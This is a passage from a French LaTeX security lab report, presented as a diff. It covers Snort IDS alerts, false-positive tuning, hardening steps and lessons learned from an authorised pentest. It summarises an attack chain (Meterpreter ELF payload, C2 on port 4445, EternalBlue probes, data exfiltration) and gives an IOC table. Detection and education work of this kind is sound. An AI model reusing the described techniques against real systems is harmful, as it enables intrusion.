-	\caption{Real Snort IDS Alerts: ELF payload detection + MS17-010 probe}
-	\label{fig:lan-alerts-capture}
-\end{figure}
-
-\subsection{Synthèse des Alertes}
-\begin{table}[H]
-	\centering
-	\small
-	\renewcommand{\arraystretch}{1.4}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{>{\centering\arraybackslash}p{1.8cm} p{2.8cm} p{2.8cm} p{5.6cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{ID}}        &
-		\textcolor{tableheadfg}{\textbf{Interface}} &
-		\textcolor{tableheadfg}{\textbf{SID}}       &
-		\textcolor{tableheadfg}{\textbf{Alerte}}                                                                                  \\
-		\hline
-		\rowcolor{tablerowalt}
-		1                                           & WAN & 1:2000418 & ET POLICY ELF download (transfert payload)                \\
-
-		2                                           & LAN & 1:2025992 & ET EXPLOIT MS17-010 EternalBlue probe (mouvement lateral) \\
-
-		\rowcolor{tablerowalt}
-		3                                           & DMZ & 1:2005677 & ET POLICY GNU/Linux APT User-Agent (apt-get update)       \\
-
-		4                                           & DMZ & 1:2010937 & http\_inspect HTTP Anomaly (requests malformees)          \\
-		\hline
-	\end{tabular}
-	\caption{Résumé des alertes Snort déclenchées lors de la chaîne d'attaque}
-	\label{tab:snort-alerts-summary}
-\end{table}
-
-\section{Faux Positifs et Tuning}
-
-Parallèlement aux vraies alertes, Snort déclenche des alertes sur du trafic légitime :
-
-\subsection{Faux Positif \#1 : APT User-Agent}
-
-\begin{lstlisting}[style=logstyle,caption=Faux positif: GNU/Linux APT detecte comme anomalie]
-	Alert Time: 2026-03-04 15:18:32
-	Interface: DMZ (em1)
-	Priority: 2 (High)
-	SID: 1:2005677
-	Message: ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management
-	
-	Source: 192.168.10.100:38764
-	Dest: 91.189.88.142:80 (Ubuntu security repo)
-\end{lstlisting}
-
-\textbf{Contexte :} Ubuntu télécharge les mises à jour de sécurité. Ceci est du trafic \textbf{complètement légitime}.
-
-\textbf{Action :} Ajouter une suppression (whitelist) pour ces flux ou réduire la priorité.
-
-\subsection{Faux Positif \#2 : HTTP Anomaly}
-
-\begin{lstlisting}[style=logstyle,caption=Faux positif: http\_inspect anomaly detectee]
-	Alert Time: 2026-03-04 15:22:10
-	Interface: DMZ (em1)
-	Priority: 2 (High)
-	SID: 1:3001000
-	Message: (http_inspect) NO CONTENT-LENGTH OR TRANSFER-ENCODING IN HTTP RESPONSE
-	
-	Source: 192.168.10.100:80
-	Dest: 192.168.100.150:12345
-\end{lstlisting}
-
-\textbf{Contexte :} Certains serveurs HTTP légitimes omettent Content-Length sur certaines réponses (ex : streaming, chunked).
-
-\textbf{Action :} Désactiver la règle ou ajouter exception.
-
-\subsection{Stratégie de Tuning}
-
-Pour réduire les faux positifs tout en conservant la détection réelle :
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Désactiver catégories bruyantes :} ET POLICY (policy violations) peut être désactivée si non pertinente.
-	\item \textbf{Ajuster seuils :} Certaines règles utilisent des seuils (ex : nombre de connexions) ; les augmenter réduit le bruit.
-	\item \textbf{Listes de suppression :} Pour des flux légitimes connus, ajouter des suppressions (sid suppression, ip suppression).
-	\item \textbf{Pass List :} Déclarer les IPs dignes de confiance (serveurs d'update, CDN) qui ne doivent jamais générer d'alertes.
-	\item \textbf{Validation progressive :} Passer progressivement du mode IDS (alertes) au mode IPS (blocage) après stabilisation.
-\end{enumerate}
-
-\section{Visibilité Défensive : Pare-feu vs IDS}
-
-\subsection{Comparaison de Perspectives}
-
-\begin{table}[H]
-	\centering
-	\small
-	\renewcommand{\arraystretch}{1.5}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{p{3.2cm} p{5.4cm} p{5.4cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Aspect}}             &
-		\textcolor{tableheadfg}{\textbf{Pare-feu (pfSense)}} &
-		\textcolor{tableheadfg}{\textbf{IDS (Snort)}}                                                                                      \\
-		\hline
-		\rowcolor{tablerowalt}
-		\textbf{Ce qu'il voit}                               & IP source/dest, ports, protocoles & Contenu des paquets, signatures, motifs \\
-
-		\textbf{Granularité}                                 & Métadonnées réseau (L3-L4)        & Payloads applicatifs (L7)               \\
-
-		\rowcolor{tablerowalt}
-		\textbf{Action}                                      & Autorise/Bloque les flux          & Alerte, logs, (optionnellement bloque)  \\
-
-		\textbf{Efficacité}                                  & Fort sur autorisations légales    & Fort sur détection d'anomalies          \\
-
-		\rowcolor{tablerowalt}
-		\textbf{Limitation}                                  & Flux autorisés = pas d'alerte     & Faux positifs, dépend des signatures    \\
-
-		\textbf{Temps réponse}                               & Instantané (blocage/autorisation) & Traitement paquets + signature matching \\
-
-		\rowcolor{tablerowalt}
-		\textbf{Exemple TP}                                  & "DMZ→LAN:445 PASS"                & "Sonde MS17-010 DETECTED"               \\
-		\hline
-	\end{tabular}
-	\caption{Comparaison visibilité : pare-feu stateful vs IDS}
-	\label{tab:firewall-vs-ids-visibility}
-\end{table}
-\section{Intégration pour Détection du Mouvement Latéral}
-
-Le mouvement latéral est une caractéristique sournoise des attaques modernes : l'attaquant se déplace d'une zone à une autre (ex : WAN$\rightarrow$DMZ$\rightarrow$LAN) en utilisant les privilèges compromis.
-
-\textbf{Snort sur interface LAN permet de :}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Détecter les probes:} Scans de ports, détection d'OS depuis un pivot interne.
-	\item \textbf{Identifier les exploits:} Tentatives d'exploitation (MS08-067, EternalBlue) contre des ressources internes.
-	\item \textbf{Alerter sur les patterns:} Multiples connexions vers des ports critiques (445 SMB, 3306 MySQL) depuis une source DMZ suspecte.
-	\item \textbf{Corréler avec les événements WAN:} "Binaire malveillant détecté en entrée WAN" + "Activité suspecte depuis DMZ vers LAN" = \textbf{Incident confirmé}.
-\end{enumerate}
-
-C'est précisément ce qui s'est produit dans ce projet :
-\begin{itemize}
-	\item \textbf{Alerte WAN} : ELF détecté
-	\item \textbf{Alerte LAN} : Sonde EternalBlue depuis DMZ
-\end{itemize}
-
-Une \textbf{corrélation manuelle} révèle la chaîne d'attaque end-to-end.
-
-% ==============================================================================
-% CHAPITRE 6 : SYNTHÈSE INTÉGRÉE ET LEÇONS APPRISES
-% ==============================================================================
-\chapter{Synthèse Intégrée et Leçons Apprises}
-
-\section{Vision Holistique : de la Défense à l'Attaque, puis à la Détection}
-
-Ce projet a documenté un cycle complet de cybersécurité :
-
-\begin{table}[H]
-	\centering
-	\renewcommand{\arraystretch}{1.6}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{>{\centering\arraybackslash}p{2cm} p{5.5cm} p{6.5cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Étape}}    &
-		\textcolor{tableheadfg}{\textbf{Objectif}} &
-		\textcolor{tableheadfg}{\textbf{Résultats}}                                                                                                           \\
-		\hline
-		\rowcolor{tablerowalt}
-		\textbf{1}                                 & Construire une infrastructure défensive segmentée   & 93-96\% réduction surface d'attaque                \\
-
-		\textbf{2}                                 & Cartographier les vulnérabilités exposées           & Telnet + HTTP identifiés (CVSS 9.8, 8.1)           \\
-
-		\rowcolor{tablerowalt}
-		\textbf{3}                                 & Valider les vulnérabilités par exploitation active  & Compromission DMZ en 32 min, pivoting LAN possible \\
-
-		\textbf{4}                                 & Déployer la détection pour intercepter les attaques & Snort détecte payload ELF + sonde MS17-010         \\
-
-		\rowcolor{tablerowalt}
-		\textbf{5}                                 & Corréler les alertes pour une vision complète       & Chaîne d'attaque reconstructible via logs          \\
-		\hline
-	\end{tabular}
-	\caption{Cycle complet : Défense $\rightarrow$ Attaque $\rightarrow$ Détection}
-	\label{tab:complete-cycle}
-\end{table}
-
-\subsection{Mesures Quantifiées}
-
-\begin{itemize}[leftmargin=*]
-	\item \textbf{Surface d'attaque réduite :} 0.2\% (2 ports ouverts / 1000)
-	\item \textbf{Durée de compromission:} 32 minutes (reconnaissance $\rightarrow$ persistence)
-	\item \textbf{Données exfiltrées:} 121 KB (43 comptes utilisateurs, configurations, services)
-	\item \textbf{Sessions C2 maintenues:} 2 sessions Meterpreter simultanees (persistence)
-	\item \textbf{Tentatives d'exploitation:} 2 (MS17-010, MS08-067 — échouées sur cible, réussies en technique)
-	\item \textbf{Alertes Snort:} 4+ dont 2 critiques (ELF download, MS17-010 probe)
-	\item \textbf{Réduction visibilité pare-feu:} 100\% des flux de pivoting étaient "autorisés"
-\end{itemize}
-
-\section{Points Forts de la Défense Observée}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Segmentation réseau :} Effective pour isoler les zones (DMZ bloquée du LAN sans règle explicite).
-	\item \textbf{NAT sélectif:} Seulement les services nécessaires exposés (23, 80 vs 50+ par défaut).
-	\item \textbf{IDS/DPI :} Snort a détecté les motifs d'attaque que les logs pare-feu masquaient.
-	\item \textbf{Patches appliqués :} Même obsolète, Windows XP a résisté aux exploits critiques.
-\end{enumerate}
-
-\section{Points Faibles Identifiés}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Telnet exposé :} Service non chiffré avec credentials faibles = vecteur trivial.
-	\item \textbf{Sudo non restreint :} sudo ALL donne élévation immédiate sans limites.
-	\item \textbf{Fail2Ban incomplet :} Surveillance SSH seule, pas Telnet.
-	\item \textbf{Segmentation contaminée :} Règle DMZ$\rightarrow$LAN permissive (même temporairement) annule l'isolation.
-	\item \textbf{Absence de SIEM :} Corrélation manuelle d'alertes, pas de réponse à incident automatisée.
-	\item \textbf{Chiffrement de C2 :} Meterpreter TLS rend le trafic opaque au pare-feu.
-\end{enumerate}
-
-
-
-\section{Leçons Apprises pour Production}
-\subsection{Défense Immédiate (24-48h)}
-\begin{tcolorbox}[
-	colback=accent!5!white,
-	colframe=accent,
-	title=\textbf{Actions Critiques},
-	before upper={\parskip=4pt}
-	]
-	\begin{enumerate}[leftmargin=*, itemsep=4pt, topsep=0pt]
-		
-		\item \textbf{Désactiver Telnet}
-		\begin{lstlisting}[caption=Desactiver Telnet, aboveskip=4pt, belowskip=0pt]
-			sudo systemctl stop inetutils-inetd
-			sudo apt remove inetutils-inetd -y
-		\end{lstlisting}
-		
-		\item \textbf{Remplacer par SSH chiffré}
-		\begin{lstlisting}[caption=Configuration SSH securisee, aboveskip=4pt, belowskip=0pt]
-			/etc/ssh/sshd_config :
-			- Port 2222 (non-standard)
-			- PasswordAuthentication no (cles SSH uniquement)
-			- AllowUsers [liste blanche]
-		\end{lstlisting}
-		
-		\item \textbf{Restreindre sudo}
-		\begin{lstlisting}[caption=Restreindre privileges sudo, aboveskip=4pt, belowskip=0pt]
-			sudo visudo :
-			telnetuser ALL=(ALL) /usr/bin/systemctl restart nginx
-			# Au lieu de : ALL=(ALL:ALL) ALL
-		\end{lstlisting}
-		
-		\item \textbf{Configurer Fail2Ban pour Telnet + SSH}
-		\begin{lstlisting}[caption=Configuration Fail2Ban, aboveskip=4pt, belowskip=0pt]
-			/etc/fail2ban/jail.local :
-			[telnetd]
-			enabled = true
-			maxretry = 2
-			bantime = -1
-			
-			[sshd]
-			maxretry = 3
-			bantime = 3600
-		\end{lstlisting}
-		
-		\item \textbf{Activer Snort en mode IPS progressivement}
-		\begin{lstlisting}[caption=Activer Snort IPS mode, aboveskip=4pt, belowskip=0pt]
-			Services > Snort > Interfaces > Blocking Mode : ON
-			(apres tuning et validation)
-		\end{lstlisting}
-		
-	\end{enumerate}
-\end{tcolorbox}
-
-\subsection{Court Terme (1-2 semaines)}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Restaurer segmentation stricte DMZ/LAN:}
-	      \begin{itemize}
-		      \item Supprimer la règle DMZ$\rightarrow$LAN permissive.
-		      \item Ajouter exceptions minimales et justifiées (ex : DMZ:192.168.10.100 $\rightarrow$ LAN:192.168.20.50 port 3306 MySQL seulement).
-	      \end{itemize}
-
-	\item \textbf{Déployer durcissement des hôtes:}
-	      \begin{itemize}
-		      \item Pare-feu hôte UFW : appliquer default deny + whitelist services.
-		      \item Audit SELinux / AppArmor pour confinement processus.
-	      \end{itemize}
-
-	\item \textbf{Mettre en place alertes Snort à SIEM:}
-	      \begin{itemize}
-		      \item Intégrer Snort à Elasticsearch + Kibana (ELK Stack) ou Splunk.
-		      \item Créer corrélations : "Payload WAN + Mouvement latéral LAN = Incident".
-	      \end{itemize}
-
-	\item \textbf{Déployer EDR (Endpoint Detection \& Response):}
-	      \begin{itemize}
-		      \item Wazuh pour visibilité processus/fichiers/logs sur endpoints.
-		      \item Détection comportements anormaux (nouveaux processus, connexions inhabitées).
-	      \end{itemize}
-\end{enumerate}
-
-\subsection{Long Terme (1 mois+)}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Remplacer Windows XP:}
-	      \begin{itemize}
-		      \item End-of-life 2014, non supporté.
-		      \item Migration vers Windows 10/11 ou Linux Desktop.
-		      \item Si impossible : isoler en VLAN dédié, pas d'accès Internet.
-	      \end{itemize}
-
-	\item \textbf{Implémenter Zero Trust Architecture:}
-	      \begin{itemize}
-		      \item Authentification multi-facteurs (MFA) pour tout accès.
-		      \item Micro-segmentation par service/application.
-		      \item Vérification continuelle de la posture de sécurité.
-	      \end{itemize}
-
-	\item \textbf{SIEM Centralisé + Incident Response:}
-	      \begin{itemize}
-		      \item Agrégation logs: pfSense, Snort, Ubuntu, Windows, applications.
-		      \item Playbooks d'IR: escalade, isolation, éradication.
-		      \item Drills trimestriels (table-top exercises).
-	      \end{itemize}
-
-	\item \textbf{Audits de Sécurité Réguliers:}
-	      \begin{itemize}
-		      \item Pentests trimestriels externes.
-		      \item Scans vulnérabilités automatisés (Nessus, OpenVAS).
-		      \item Red Team exercises annuels.
-	      \end{itemize}
-\end{enumerate}
-
-\section{Recommandations Spécifiques au Tuning Snort}
-
-\begin{table}[H]
-	\centering
-	\small
-	\renewcommand{\arraystretch}{1.4}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{p{3.2cm} p{3.5cm} p{6.3cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Catégorie}}      &
-		\textcolor{tableheadfg}{\textbf{Recommandation}} &
-		\textcolor{tableheadfg}{\textbf{Justification}}                                                                                            \\
-		\hline
-		\rowcolor{tablerowalt}
-		\textbf{À activer}                               & exploit/, netbios-smb/, web/                  & Couverture menaces critiques            \\
-
-		\textbf{À désactiver}                            & policy/ (bruyant), dos/ (peu pertinent)       & Réduire faux positifs                   \\
-
-		\rowcolor{tablerowalt}
-		\textbf{Pass List}                               & IPs mises à jour (91.189.88.142 Ubuntu repos) & Éviter alertes sur trafic légitime      \\
-
-		\textbf{Suppress}                                & SID:2005677 si non pertinent (APT UA)         & Tuning des bruits identifiés            \\
-
-		\rowcolor{tablerowalt}
-		\textbf{Monitoring}                              & Logs d'alertes : /var/log/snort/alert         & Sauvegarder, analyser, corréler         \\
-
-		\textbf{Mise à jour}                             & ET Open daily, Snort weekly                   & Signatures à jour = détection améliorée \\
-		\hline
-	\end{tabular}
-	\caption{Stratégie de tuning Snort pour réduire faux positifs}
-	\label{tab:snort-tuning-strategy}
-\end{table}
-
-\subsection{Indicateurs de Compromission (IOCs)}
-
-Pour faciliter la détection et la réponse à incident en production, voici les IOCs spécifiques à ce projet :
-
-\begin{table}[H]
-	\centering
-	\small
-	\renewcommand{\arraystretch}{1.3}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{p{2.5cm} p{4.5cm} p{6cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Type}}       &
-		\textcolor{tableheadfg}{\textbf{Indicateur}} &
-		\textcolor{tableheadfg}{\textbf{Description}}                                                                                            \\
-		\hline
-		\rowcolor{tablerowalt}
-		\textbf{IP}                                  & 192.168.100.150                                         & Machine attaquante (Parrot)     \\
-
-		\textbf{Port}                                & 4445/TCP                                                & C2 Meterpreter                  \\
-
-		\rowcolor{tablerowalt}
-		\textbf{Fichier}                             & /tmp/meterpreter.elf                                    & Payload malveillant (250 bytes) \\
-
-		\textbf{Hash}                                & SHA256(meterpreter.elf)                                 & Signature fichier               \\
-
-		\rowcolor{tablerowalt}
-		\textbf{Processus}                           & meterpret (PID 4907, 4908)                              & Agent C2 en mémoire             \\
-
-		\textbf{Connexion}                           & 192.168.10.100:56526 $\rightarrow$ 192.168.100.150:4445 & Canal C2 actif                  \\
-
-		\rowcolor{tablerowalt}
-		\textbf{User-Agent}                          & wget/1.21.3                                             & Téléchargement payload          \\
-
-		\textbf{Signature Snort}                     & SID:2000418, SID:2025992                                & Détection ELF, EternalBlue      \\
-		\hline
-	\end{tabular}
-	\caption{IOCs : indicateurs de compromission pour détection en production}
-	\label{tab:iocs-list}
-\end{table}
-
-% ==============================================================================
-% CHAPITRE 7 : CONCLUSIONS ET PERSPECTIVES
-% ==============================================================================
-\chapter{Conclusions et Perspectives Futures}
-
-\section{Contributions du Projet}
-
-\subsection{Contributions Techniques}
-
-\begin{enumerate}
-	\item \textbf{Déploiement Multi-Couches :} Démonstration d'une architecture de sécurité réaliste (pfSense + Snort + pare-feu hôte) facilement reproductible en laboratoire ou PME.
-
-	\item \textbf{Documentation Quantifiée :} Chaque phase (défense, reconnaissance, attaque, détection) inclut des métriques mesurables (surface d'attaque, timeline, alertes SID).
-
-	\item \textbf{Validation Pratique :} Les vulnérabilités théoriques (Telnet, sudo ALL) ont été exploitées et documentées avec preuves (logs, captures d'écran).
-
-	\item \textbf{Signatures Snort :} Identification de deux SIDs critiques (ELF download, MS17-010) révélant l'importance de la DPI.
-\end{enumerate}
-
-\subsection{Contributions Pédagogiques}
-
-\begin{enumerate}
-	\item \textbf{Perspective Attaquant} : Students comprennent les motivations, tactiques et techniques (MITRE ATT\&CK) d'une chaîne d'attaque réaliste.
-
-	\item \textbf{Perspective Défenseur} : Les limites de chaque contrôle de sécurité deviennent évidentes (pare-feu stateful $\neq$ IDS, Fail2Ban requiert config, etc.).
-
-	\item \textbf{Pensée Critique} : La progression TP1$\rightarrow$TP4 encourage à questionner : ``Qu'est-ce qui aurait pu arrêter cette attaque à chaque étape?''
-
-	\item \textbf{Matérialité} : Les théories (segmentation, DPI, IDS) deviennent tangibles via reproduction pratique.
-\end{enumerate}
-
-\subsection{Vision Intégrée : Aucune Solution Parfaite}
-
-Ce projet valide un principe fondamental :
-
-\begin{quote}
-	\textit{Il n'existe pas de solution de sécurité unique et parfaite. La sécurité est un processus continu de couches complémentaires, tuning, monitoring, et adaptation face aux menaces évolutives.}
-\end{quote}
-
-
-\section{Perspectives Futures et Extensions Possibles}
-
-\subsection{Extensions Techniques Immédiates}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Déploiement SIEM complet :}
-	      \begin{itemize}
-		      \item Intégrer Elasticsearch + Kibana (ELK Stack) ou Splunk.
-		      \item Créer dashboards : alertes en temps réel, statistiques d'attaque, tendances.
-		      \item Automates de réponse à incident : isolation automatique, rollback.
-	      \end{itemize}
-
-	\item \textbf{EDR (Endpoint Detection \& Response) :}
-	      \begin{itemize}
-		      \item Déployer Wazuh agent sur Ubuntu et Windows XP.
-		      \item Surveiller processus, fichiers, connexions réseau en temps réel.
-		      \item Détecter comportements anormaux (nouveaux binaires, privilèges escaladés).
-	      \end{itemize}
-
-	\item \textbf{Activer Snort en mode IPS :}
-	      \begin{itemize}
-		      \item Après tuning complet et validation.
-		      \item Profiter du blocage actif des payloads malveillants.
-		      \item Mesurer impact sur performance (latence, throughput).
-	      \end{itemize}
-\end{enumerate}
-
-\subsection{Exercices Blue Team Avancés}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Incident Response Simulations (IR Drills) :}
-	      \begin{itemize}
-		      \item Simuler une alerte Snort ; time les équipes à détecter, isoler, éradiquer.
-		      \item Mesurer MTTR (Mean Time To Respond).
-	      \end{itemize}
-
-	\item \textbf{Red Team vs Blue Team (Exercice Adversaire) :}
-	      \begin{itemize}
-		      \item Red Team : tenter des attaques variantes (autres vecteurs, timing, obfuscation).
-		      \item Blue Team : adapter défenses, tuning, détection.
-		      \item Évaluer évolution de la posture de sécurité.
-	      \end{itemize}
-
-	\item \textbf{Threat Modeling et Risk Assessment :}
-	      \begin{itemize}
-		      \item STRIDE, PASTA, ou autre méthodologie.
-		      \item Quantifier risques résiduels après mesures de sécurité.
-	      \end{itemize}
-\end{enumerate}
-
-\subsection{Extensions Architecturales}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Déploiement d'un Contrôleur Active Directory :}
-	      \begin{itemize}
-		      \item Intégrer Windows Server DC dans le LAN.
-		      \item Tester attaques Kerberos (Kerberoasting, Golden Ticket, etc.).
-		      \item Dépister mouvement latéral intra-domaine.
-	      \end{itemize}
-
-	\item \textbf{Réseau WiFi Segmenté :}
-	      \begin{itemize}
-		      \item Tester isolation Guest vs Corporate.
-		      \item Évaluer risques roaming et latéral movement WiFi.
-	      \end{itemize}
-
-	\item \textbf{Cloud Hybrid (AWS/Azure) :}
-	      \begin{itemize}
-		      \item Étendre segmentation à des ressources cloud.
-		      \item Tester cross-datacenter pivoting.
-	      \end{itemize}
-\end{enumerate}
-
-\section{Recommandations Finales pour Adoption en Production}
-
-\subsection{Roadmap Proposée (6 mois)}
-
-\begin{table}[H]
-	\centering
-	\small
-	\renewcommand{\arraystretch}{1.4}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{p{1.8cm} p{4cm} p{7.2cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Mois}}  &
-		\textcolor{tableheadfg}{\textbf{Étape}} &
-		\textcolor{tableheadfg}{\textbf{Actions}}                                                                                                    \\
-		\hline
-		\rowcolor{tablerowalt}
-		M1-2                                    & \textbf{Assessment}  & Audit sécurité interne, identification assets critiques, baseline de risque \\
-
-		M2-3                                    & \textbf{Hardening}   & Désactiver services legacy, appliquer patches, configurer MFA, durcir SSH   \\
-
-		\rowcolor{tablerowalt}
-		M3-4                                    & \textbf{Monitoring}  & Déployer Snort/Wazuh, intégrer SIEM, créer alertes, tuning                  \\
-
-		M4-5                                    & \textbf{Validation}  & IR Drills, Red Team test, mesurer MTTR, affiner playbooks                   \\
-
-		\rowcolor{tablerowalt}
-		M5-6                                    & \textbf{Operational} & Transition vers mode production, documentation, formation équipe            \\
-		\hline
-	\end{tabular}
-	\caption{Roadmap 6 mois pour adoption en production}
-	\label{tab:production-roadmap}
-\end{table}
-
-\subsection{Métriques de Succès}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Détection :} Détection $>$ 90\% des attaques simulées dans les 5 minutes.
-	\item \textbf{Réponse :} MTTR $<$ 30 minutes pour incidents critiques.
-	\item \textbf{Réduction Surface :} Surface d'attaque $<$ 1\%.
-	\item \textbf{Faux Positifs :} $<$ 5\% d'alertes non pertinentes après tuning.
-	\item \textbf{Disponibilité :} $>$ 99.9\% uptime malgré défenses actives.
-\end{enumerate}
-
-\section{Citation de Conclusion}
-
-\begin{quote}
-	\textit{``Cybersecurity is not a product, but a process. It is a process that requires continuous monitoring, assessment, and improvement to keep pace with evolving threats.''}
-
-	--- Art Coviello, former CEO RSA
-\end{quote}
-
-Ce projet valide précisément cette maxime : la sécurité n'est ni un event (déploiement Snort), ni un produit (pare-feu), mais un \textbf{processus continu} d'adaptation, monitoring, et amélioration.
-
-Les équipes défensives qui réussiront seront celles qui :
-\begin{itemize}
-	\item Comprennent les tactiques attaquantes (offensive mindset).
-	\item Déploient des contrôles multicouches (défense en profondeur).
-	\item Automatisent la détection et la réponse (SIEM + IR).
-	\item Itèrent et s'améliorent (pentests réguliers, drills, reviews).
-\end{itemize}
-
-% ==============================================================================
-% BIBLIOGRAPHIE
-% ==============================================================================
-\begin{thebibliography}{99}
-
-	\bibitem{owasp-top10}
-	OWASP Foundation. \textit{OWASP Top 10 -- 2021}. OWASP, 2021. Consulté sur \url{https://owasp.org/Top10/}
-
-	\bibitem{mitre-attack}
-	MITRE Corporation. \textit{ATT\&CK -- Adversarial Tactics, Techniques, and Common Knowledge}. MITRE, 2024. Consulté sur \url{https://attack.mitre.org/}
-
-	\bibitem{nist-framework}
-	NIST. \textit{Cybersecurity Framework (CSF) 2.0}. National Institute of Standards and Technology, 2024. Consulté sur \url{https://www.nist.gov/cyberframework/}
-
-	\bibitem{metasploit-unleashed}
-	Offensive Security. \textit{Metasploit Unleashed}. Offensive Security, 2024. Consulté sur \url{https://www.offensive-security.com/metasploit-unleashed/}
-
-	\bibitem{snort-manual}
-	Snort Development Team. \textit{Snort User Manual}. Snort, 2024. Consulté sur \url{https://docs.snort.org/}
-
-	\bibitem{pfsense-docs}
-	Netgate. \textit{pfSense Documentation}. Netgate, 2024. Consulté sur \url{https://docs.netgate.com/pfsense/}
-
-	\bibitem{et-open}
-	Proofpoint. \textit{Emerging Threats Open Ruleset}. Emerging Threats, 2024. Consulté sur \url{https://rules.emergingthreats.net/}
-
-	\bibitem{sans-pentesting}
-	SANS Institute. \textit{Penetration Testing Methodologies and Best Practices}. SANS, 2023. Consulté sur \url{https://www.sans.org/white-papers/}
-
-	\bibitem{kill-chain}
-	Hutchins, E. M., Cloppert, M. J., et Amin, R. M. \textit{Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains}. Lockheed Martin, 2011.
-
-	\bibitem{cis-controls}
-	CIS. \textit{CIS Controls v8}. Center for Internet Security, 2021. Consulté sur \url{https://www.cisecurity.org/cis-controls/}
-
-	\bibitem{giac-certified}
-	GIAC. \textit{GIAC Certified Intrusion Analyst (GCIA)}. GIAC, 2024. Consulté sur \url{https://www.giac.org/certification/certified-intrusion-analyst-gcia}
-
-	\bibitem{nmap-book}
-	Lyon, Gordon. \textit{Nmap Network Scanning}. Insecure.Com LLC, 2009.
-
-\end{thebibliography}
-
-% ==============================================================================
-% ANNEXES
-% ==============================================================================
-\appendix
-\chapter{Annexes Techniques}
-
-\section{Glossaire Technique}
-
-\begin{description}
-	\item[ACL (Access Control List)] Ensemble de règles contrôlant quels utilisateurs/systèmes peuvent accéder à une ressource.
-
-	\item[APT (Advanced Persistent Threat)] Attaque sophistiquée menée par groupe organisé, visant accès durable et discrétion.
-
-	\item[C2 (Command \& Control)] Infrastructure permettant à un attaquant de contrôler des systèmes compromis.
-
-	\item[CVE (Common Vulnerabilities and Exposures)] Identifiant public pour vulnérabilité de sécurité connue.
-
-	\item[CVSS (Common Vulnerability Scoring System)] Notation standardisée de sévérité vulnérabilité (0-10).
-
-	\item[DEP (Data Execution Prevention)] Protection système empêchant exécution code depuis certaines régions mémoire.
-
-	\item[DPI (Deep Packet Inspection)] Inspection du contenu complet des paquets, pas seulement en-têtes.
-
-	\item[DMZ (Demilitarized Zone)] Zone réseau intermédiaire entre Internet et LAN interne, hébergeant services publics.
-
-	\item[EDR (Endpoint Detection \& Response)] Technologie surveillant endpoints pour détecter/répondre menaces.
-
-	\item[ELF (Executable and Linkable Format)] Format binaire exécutable pour systèmes Linux/Unix.
-
-	\item[FTP (File Transfer Protocol)] Protocole transfert fichiers (non sécurisé, legacy).
-
-	\item[ICMP (Internet Control Message Protocol)] Protocole utilisé par ping pour tester connectivité.
-
-	\item[IDS (Intrusion Detection System)] Système détectant activités malveillantes (mode passif, alerting seul).
-
-	\item[IPS (Intrusion Prevention System)] Système détectant ET bloquant activités malveillantes (mode actif).
-
-	\item[IRC (Internet Relay Chat)] Protocole communication temps-réel (utilisé par certains malwares pour C2).
-
-	\item[Lateral Movement] Déplacement attaquant au sein d'un réseau après compromission initiale.
-
-	\item[MAC (Media Access Control)] Adresse physique identifiant interface réseau (ex : 00:0c:29:39:8b:76).
-
-	\item[Meterpreter] Agent avancé Metasploit pour post-exploitation avec chiffrement et pivoting natifs.
-
-	\item[MITRE ATT\&CK] Framework cataloguant tactiques, techniques, et procédures d'attaquants.
-
-	\item[MTU (Maximum Transmission Unit)] Taille maximale paquet pouvant transiter réseau (généralement 1500 bytes).
-
-	\item[NAT (Network Address Translation)] Technique redirigeant trafic vers adresses IP internes (port forwarding).
-
-	\item[NIDS (Network Intrusion Detection System)] IDS opérant au niveau réseau (ex : Snort).
-
-	\item[NX (No Execute)] Bit processeur empêchant exécution code depuis pile (protection débordement).
-
-	\item[Payload] Code exécutable expédié en charge utile d'attaque.
-
-	\item[Pentesting (Penetration Testing)] Test d'intrusion autorisé pour évaluer sécurité système.
-
-	\item[Pivoting] Technique utilisant système compromis comme point rebond vers réseaux inaccessibles.
-
-	\item[Post-Exploitation] Phase d'attaque après accès initial, visant escalade, persistence, exfiltration.
-
-	\item[RDP (Remote Desktop Protocol)] Protocole Microsoft pour accès bureau distant (port 3389).
-
-	\item[Reverse Shell] Shell où cible se connecte à attaquant (inverse de bind shell).
-
-	\item[RCE (Remote Code Execution)] Capacité exécuter code arbitraire sur cible distante.
-
-	\item[Rootkit] Malware cachant sa présence, modifiant système d'exploitation.
-
-	\item[SIEM (Security Information and Event Management)] Plateforme centralisée agrégant logs pour détection menaces.
-
-	\item[SID (Signature ID)] Identifiant unique règle Snort (ex : 1:2025992).
-
-	\item[SMB (Server Message Block)] Protocole partage fichiers/imprimantes réseau (ports 139, 445).
-
-	\item[SSH (Secure Shell)] Protocole d'accès distant chiffré (replacement sécurisé pour Telnet, port 22).
-
-	\item[Stateful Firewall] Pare-feu maintenant table états connexions, autorisant retour trafic établi.
-
-	\item[Telnet] Protocole accès distant non chiffré (port 23, legacy, vulnerable).
